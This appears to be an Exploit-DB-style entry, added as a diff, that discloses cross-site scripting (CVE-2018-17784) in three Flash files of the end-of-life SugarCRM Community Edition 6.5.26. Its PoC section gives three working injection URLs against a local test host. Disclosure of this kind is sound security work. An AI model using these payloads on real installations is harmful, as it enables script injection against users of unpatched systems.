@@ -1,0 +1,26 @@
+# Exploit Title: SugarCRM 6.5.26 - Cross-Site Scripting
+# Date: 2018-09-29
+# Exploit Author: Purplemet Security
+# Author Website: https://www.purplemet.com/
+# Vendor Homepage: https://www.sugarcrm.com/
+# Software Link: https://sourceforge.net/projects/sugarcrm/
+# Version: 6.5.26
+# Tested on: Ubuntu 16.04
+# CVE : CVE-2018-17784
+
+# Description
+# A vulnerability in uploader.swf, io.swf and flashcanvas.swf in SugarCRM Community Edition 6.5.26 
+# could allow an unauthenticated, remote attacker to conduct a cross-site scripting 
+# (XSS) attack on a targeted system.
+# SugarCRM Community Edition 6.5 had reached its end-of-life and is no longer supported. 
+# 6.5.26 is the last version and no patches will be provided by the vendor.
+
+# PoC:
+# 1) 
+http://192.168.13.37/sugarcrm/include/javascript/yui/build/uploader/assets/uploader.swf?allowedDomain=\%22})))}catch(e){alert%20(/XSS/);}
+
+# 2) 
+http://192.168.13.37/sugarcrm/include/javascript/yui3/build/io/io.swf?yid=\%22));}catch(e){alert('XSS');}
+
+# 3) 
+http://192.168.13.37/sugarcrm/include/SugarCharts/Jit/FlashCanvas/flashcanvas.swf?id=12345678\%22));}catch(e){alert(%27XSS%27)}
